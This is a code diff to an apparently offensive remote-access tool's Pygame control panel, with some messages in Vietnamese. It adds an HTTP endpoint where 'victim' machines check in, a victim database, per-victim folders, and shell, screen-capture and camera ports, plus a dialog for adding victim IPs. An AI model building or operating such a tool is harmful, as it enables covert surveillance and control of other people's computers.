@@ -29,7 +29,7 @@ from ui.utils.network import R_tcp
 from ui.utils.host_manager import HostManager
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
-
+from ui.handlers.inputbox_handler import connect_to_db, get_ip_all_victims, insert_new_victim, is_valid_ip
 # Initialize Pygame
 pygame.init()
 
@@ -47,7 +47,7 @@ NETWORK_RANGES = [
     "192.168.56",
 ]
 
-VICTIM_IPS = ['192.168.1.15']
+VICTIM_IPS =  get_ip_all_victims()
 
 # Thread pool for background tasks
 thread_pool = ThreadPoolExecutor(max_workers=4)
@@ -75,7 +75,53 @@ class HostNotificationHandler(BaseHTTPRequestHandler):
                     ui_state.discovered_hosts.add(new_victim)
                     if new_victim not in VICTIM_IPS:
                         VICTIM_IPS.append(new_victim)
-                        
+                       
+                    
+                    # Save the host with full information and create folder structure
+                    victim_dir = host_manager.create_victim_folder(new_victim)
+                    host_manager.add_host(
+                        new_victim, 
+                        ports=data.get('ports', {
+                            'shell': 5000,
+                            'screen': 5001,
+                            'camera': 5002
+                        })
+                    )
+                    
+                    print(f"Created victim directory: {victim_dir}")
+                    
+                    # Set initial status to Reachable for new victim
+                    ui_state.victims_status[new_victim] = "Reachable"
+                    
+                    # Force UI update in a thread-safe way using custom event
+                    NEW_VICTIM_EVENT = pygame.USEREVENT + 1
+                    pygame.event.post(pygame.event.Event(NEW_VICTIM_EVENT))
+
+                self.send_response(200)
+                self.end_headers()
+                
+            except Exception as e:
+                print(f"Error handling new victim notification: {e}")
+                self.send_response(500)
+                self.end_headers()
+
+    def do_POST(self):
+        if self.path == '/new_victim':
+            try:
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length)
+                data = json.loads(post_data.decode('utf-8'))
+
+                if 'victim_ip' in data:
+                    new_victim = data['victim_ip']
+                    print(f"New victim connected: {new_victim}")
+                    
+                    # Add to discovered hosts and VICTIM_IPS if not already present
+                    ui_state.discovered_hosts.add(new_victim)
+                    if new_victim not in VICTIM_IPS:
+                        VICTIM_IPS.append(new_victim)
+                        insert_new_victim(new_victim)
+
                     # Save the host with full information and create folder structure
                     victim_dir = host_manager.create_victim_folder(new_victim)
                     host_manager.add_host(
@@ -593,11 +639,68 @@ class NetworkScanner:
         if hasattr(self, 'scan_thread'):
             self.scan_thread.join(timeout=1.0)
 
+def open_add_ip_dialog(screen, font):
+   
+    dialog_width, dialog_height = 400, 300
+    input_width, input_height = 300, 40
+    button_width, button_height = 100, 40
+    margin = 20
+
+
+    screen_width, screen_height = screen.get_size()
+    dialog_rect = pygame.Rect((screen_width - dialog_width) // 2, (screen_height - dialog_height) // 2, dialog_width, dialog_height)
+    input_rect = pygame.Rect((screen_width - input_width) // 2, dialog_rect.top + 80, input_width, input_height)
+    ok_button = pygame.Rect(input_rect.centerx - button_width - margin, input_rect.bottom + margin, button_width, button_height)
+    cancel_button = pygame.Rect(input_rect.centerx + margin, input_rect.bottom + margin, button_width, button_height)
+
+    text = ""
+    active = False
+    running = True
+
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                pygame.quit()
+                sys.exit()
+            elif event.type == pygame.MOUSEBUTTONDOWN:
+                if ok_button.collidepoint(event.pos):
+                    return text.strip() 
+                elif cancel_button.collidepoint(event.pos):
+                    return None  
+                elif input_rect.collidepoint(event.pos):
+                    active = True
+                else:
+                    active = False  
+
+            elif event.type == pygame.KEYDOWN and active:
+                if event.key == pygame.K_RETURN:
+                    return text.strip()  
+                elif event.key == pygame.K_BACKSPACE:
+                    text = text[:-1] 
+                else:
+                    text += event.unicode 
+        screen.fill((200, 200, 200)) 
+        pygame.draw.rect(screen, (255, 255, 255), dialog_rect, 0)
+
+        pygame.draw.rect(screen, BLACK if not active else GREEN, input_rect, 2)
+        txt_surface = font.render(text, True, BLACK)
+        screen.blit(txt_surface, (input_rect.x + 10, input_rect.y + 10))
+        pygame.draw.rect(screen, GREEN, ok_button)
+        ok_text = font.render("OK", True, WHITE)
+        screen.blit(ok_text, (ok_button.x + (button_width - ok_text.get_width()) // 2, ok_button.y + (button_height - ok_text.get_height()) // 2))
+        pygame.draw.rect(screen, RED, cancel_button)
+        cancel_text = font.render("Cancel", True, WHITE)
+        screen.blit(cancel_text, (cancel_button.x + (button_width - cancel_text.get_width()) // 2, cancel_button.y + (button_height - cancel_text.get_height()) // 2))
+        pygame.display.flip()
 
 def main():
     global options
     options = parseargs()
-
+    conn = connect_to_db()
+    if not conn:
+        print("Không thể kết nối đến cơ sở dữ liệu.")
+        return
+    
     # Define custom events
     NEW_VICTIM_EVENT = pygame.USEREVENT + 1
 
@@ -642,17 +745,35 @@ def main():
                     ui_state.running = False
                     pygame.quit()
                     sys.exit()
+
                 elif event.type == NEW_VICTIM_EVENT:
                     update_displays()  # Update UI when new victim connects
+
                 elif event.type == pygame.MOUSEBUTTONDOWN:
                     if event.button == 1:
-                        for display in displays:
-                            if display.rect.collidepoint(event.pos[0], event.pos[1] + ui_state.scroll_y):
-                                show_full_screen(display, options)
                         if add_button.rect.collidepoint(event.pos):
-                            new_display = create_new_display()
-                            displays.append(new_display)
-                            ui_state.max_scroll_y = max(0, (len(displays) // 3) * 200 + 50 - HEIGHT)
+                            new_ip = open_add_ip_dialog(screen, font)
+                            if new_ip and is_valid_ip(new_ip):
+                                insert_new_victim(new_ip)
+                                ui_state.discovered_hosts.add(new_ip)
+                                victim_dir = host_manager.create_victim_folder(new_ip)
+                                host_manager.add_host(
+                                    new_ip,
+                                    ports={
+                                        'shell': options.port + 3, 
+                                        'screen': options.port + 4,
+                                        'camera': options.port + 5
+                                    }
+                                )
+                                update_displays()
+                            else:
+                                print("Địa chỉ IP không hợp lệ")
+                        else:
+                            for display in displays:
+                                if display.rect.collidepoint(event.pos[0], event.pos[1] + ui_state.scroll_y):
+                                    show_full_screen(display, options)
+                                    break
+
                     elif event.button == 4:  # Scroll up
                         ui_state.scroll_y = max(0, ui_state.scroll_y - 20)
                     elif event.button == 5:  # Scroll down
@@ -669,10 +790,8 @@ def main():
             for i, display in enumerate(displays):
                 ip = display.text
                 status = ui_state.victims_status.get(ip, "Not reachable")
-                # Calculate position relative to the display
                 x = display.rect.x + display.rect.width - 30  # 30 pixels from right edge
                 y = display.rect.y + 10  # 10 pixels from top
-                # Adjust y position by scroll offset
                 y_adjusted = y - ui_state.scroll_y
                 if status == "Reachable":
                     status_button = Button(x, y, 20, 20, "", GREEN)
